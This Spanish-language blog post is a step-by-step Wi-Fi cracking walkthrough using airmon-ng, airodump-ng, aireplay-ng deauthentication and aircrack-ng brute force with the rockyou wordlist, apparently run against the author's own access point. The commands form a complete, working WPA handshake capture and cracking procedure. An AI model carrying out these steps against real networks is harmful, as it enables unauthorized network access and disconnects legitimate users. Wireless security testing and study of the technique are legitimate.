---
layout: post
title: Hacking Wifi
date: 2024-04-06 12:24:23 
category: sample
vm: linux
---

### **1)** Vemos nuestra interfaz de red wifi
```
     iwconfig 
```
![iwconfig](/notas/public/img/hwifi/iwconfig.png)

<br>

### **2)** Le cambiamos el ESSID para no complicarnos
```
    sudo ip link set dev wlxb4b0240921e2 name wlan0

    iwconfig 
```
 ![essid](/notas/public/img/hwifi/essid_modify.png)

<br>

### **3)** Eliminamos procesos 'conflictivos'
```
    sudo airmon-ng check kill
```
![kill](/notas/public/img/hwifi/kill_process.png)


<br>

### **4)** Iniciamos el modo monitor
```
    sudo airmon-ng start wlan0
```
![start](/notas/public/img/hwifi/start_mode.png)

_> El nombre de nuestra interface puede variar, en este caso se mantiene._

<br>

### **5)** Escuchamos los Puntos de Acceso (AP)
```
    sudo airodump-ng wlan0
```
![listen](/notas/public/img/hwifi/listen_wifi.png)

- **Mi_wifi** _AP victima_
    - **FC:A6:21:D5:D8:17** - Mac
    - **11** - Canal 


<br>

### **6)** Vemos los dispositivos del AP objetivo
```
    sudo airodump-ng -c 11 --bssid FC:A6:21:D5:D8:17 -w save_prueba wlan0
```
![devices](/notas/public/img/hwifi/devices_wifi.png)

_En este caso hay un dispositivo movil conectado._

- **44:6D:6C:35:40:DB** - Mac del Dispositivo dentro del AP Mi_Wifi

<br>

### **7)** Desautenticamos al usuario del punto de acceso
```
    sudo aireplay-ng --deauth 5 -a FC:A6:21:D5:D8:17 -c 44:6D:6C:35:40:DB wlan0
```
![handshake](/notas/public/img/hwifi/handshake.png)

_Tenemos el handshake, donde viaja 'la contraseña cifrada'_

- Listamos el reporte:

```
    ls
```

![cap](/notas/public/img/hwifi/save_cap.png)

<br>

### **8)** Aplicamos fuerza bruta para obtener la contraseña
```
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b FC:A6:21:D5:D8:17 save_prueba-01.cap
```
![key](/notas/public/img/hwifi/key.png)

